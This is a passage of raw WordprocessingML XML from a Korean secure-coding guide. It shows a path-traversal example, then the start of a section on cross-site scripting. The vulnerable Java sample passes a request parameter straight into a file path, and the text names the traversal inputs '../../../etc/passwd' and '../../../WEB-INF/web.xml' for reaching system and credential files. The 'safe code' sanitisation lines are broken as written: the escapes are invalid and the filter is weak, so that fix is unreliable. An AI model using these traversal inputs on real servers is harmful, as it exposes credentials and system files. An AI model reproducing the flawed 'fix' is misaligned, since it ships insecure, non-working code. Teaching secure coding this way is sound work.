                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>외부</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파일</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>경로에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>직접</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String fileName = request.getParameter("P");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>fis = new FileInputStream("C:/datas/" + fileName);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">// </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> "../../../etc/passwd" </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>임의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파일</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>접근</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가능</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파일명에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> ../../../WEB-INF/web.xml </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>입력하면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>웹</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>루트</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>바깥의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시스템</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파일에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>접근할</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있습니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. DB </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>접속</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>정보가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>담긴</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>설정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파일</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>계정</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>정보</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>소스코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>등</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>민감한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파일이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>그대로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>노출되는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>있습니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>경로순회</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>문자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>제거</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>후</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>String fileName = request.getParameter("P");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>fileName = fileName.replaceAll("\.\.","").replaceAll("/","").replaceAll("\\","");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>fis = new FileInputStream("C:/datas/" + fileName);</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00126989" w:rsidRDefault="00126989"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">4. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>크로스사이트</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>스크립트</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>(XSS)</w:t>
      </w:r>
      <w:r w:rsidR="00CB0DA2">
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="00F62228">
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="00F62228">
        <w:rPr>
          <w:rFonts w:ascii="바탕체" w:eastAsia="바탕체" w:hAnsi="바탕체" w:cs="바탕체" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>사용자</w:t>
      </w:r>
      <w:r w:rsidR="00F62228">
        <w:rPr>
          <w:rFonts w:ascii="바탕체" w:eastAsia="바탕체" w:hAnsi="바탕체" w:cs="바탕체"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F62228">
        <w:rPr>
          <w:rFonts w:ascii="바탕체" w:eastAsia="바탕체" w:hAnsi="바탕체" w:cs="바탕체" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
